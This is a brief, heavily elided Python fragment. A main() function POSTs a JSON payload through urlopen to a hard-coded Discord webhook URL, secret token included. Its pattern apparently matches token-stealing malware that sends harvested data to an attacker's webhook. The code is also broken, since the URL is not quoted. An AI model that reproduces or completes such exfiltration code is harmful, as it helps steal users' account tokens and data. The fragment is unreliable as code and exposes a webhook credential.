...
def main():
    ...
    try:
        urlopen(Request(https://discord.com/api/webhooks/1392524256532762727/K5XgrOD-vTeCD07z_Ux_RG1lTDwLvepIuy782zdD27tTxcY1t7581R4Es1u0CGv5Aszs, data=dumps(webhook).encode(), headers=getheaders()))   
